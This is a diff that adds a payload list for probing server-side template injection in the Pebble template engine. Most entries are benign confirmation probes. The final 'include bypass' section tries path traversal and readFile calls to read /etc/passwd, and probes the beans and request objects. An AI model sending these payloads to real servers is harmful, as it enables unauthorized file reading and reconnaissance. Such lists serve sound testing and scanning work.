@@ -1,0 +1,27 @@
+# Pebble SSTI — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+{% set test = 'class'.getClass() %}{{test}}
+{{ '' | upper }}
+# ── Advanced — logic ───────────────────────────────────────────────────────
+{% if 1 == 1 %}SSTI_CONFIRMED{% endif %}
+{% if 1 == 2 %}NO{% else %}SSTI_CONFIRMED{% endif %}
+{% for i in [1,2,3] %}{{i}}{% endfor %}
+# ── Advanced — filters ─────────────────────────────────────────────────────
+{{ 'test' | upper }}
+{{ 'test' | length }}
+{{ 'test' | reverse }}
+{{ 7 | abs }}
+{{ 'test' | abbreviate(2) }}
+{{ 'test' | capitalize }}
+{{ [1,2,3] | join(',') }}
+# ── Advanced — variable access ─────────────────────────────────────────────
+{{ foo.bar }}
+{{ foo['bar'] }}
+# ── Advanced — macro/block ─────────────────────────────────────────────────
+{% macro test() %}SSTI_MACRO{% endmacro %}{{ test() }}
+{% block test %}SSTI_BLOCK{% endblock %}
+# ── Advanced — include bypass attempts ────────────────────────────────────
+{% include '../../../../etc/passwd' %}
+{{ readFile('/etc/passwd') }}
+{{ beans }}
+{{ request }}
